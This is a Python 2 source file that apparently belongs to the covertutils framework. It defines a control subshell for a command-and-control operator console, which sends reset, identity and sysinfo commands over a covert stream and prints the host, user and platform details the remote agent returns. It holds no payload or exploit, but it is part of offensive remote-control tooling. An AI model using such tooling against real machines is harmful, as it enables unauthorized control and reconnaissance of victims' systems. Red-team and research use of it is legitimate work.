import json
# from covertutils.payloads.generic.control import Commands as control_commands
from covertutils.shells.subshells import SimpleSubShell

Commands = {
	'reset' : 'RST',
	'identity' : 'ID',
	'sysinfo' : 'SI'
}


def message_handle(message, instance) :

	if instance.sysinfo :
		# sysinfo_var = message
		# sysinfo = json.loads(message)
		sysinfo = message.split('+')
		print """
General:
	Host: {}
	Machine: {}
	Version: {}
	Locale: {}
	Platform: {}
	Release: {}
	System: {}
	Processor: {}
	User: {}

Specifics:
	Windows: {}
	Linux: {}

		""".format( *sysinfo )
# 	MacOS: {}
		instance.base_shell.sysinfo = sysinfo
		instance.sysinfo = False
	else :
		print message



class ControlSubShell ( SimpleSubShell ) :

	def __init__( self, stream, handler, queue_dict, base_shell, ignore_messages = set(['X']), prompt_templ = " (>{stream}<) |-> ") :
		SimpleSubShell.__init__( self, stream, handler, queue_dict, base_shell, ignore_messages, prompt_templ )
		self.updatePrompt( )
		self.message_function = message_handle
		self.sysinfo = False


	def default( self, line ) :

		comm, args, line = self.parseline(line)
		try :
			command = Commands[comm]
		except :
			print "No such control command!"
			return
		# print "Sending '%s' command" % command
		if command == Commands['reset'] :
			print "Reseting handler"
			self.resetHandler()

		if command == Commands['sysinfo'] :
			self.sysinfo = True


		print "Sending '%s' control command!" % command
		self.handler.preferred_send( command, self.stream )






	def resetHandler( self ) :
		self.handler.reset()
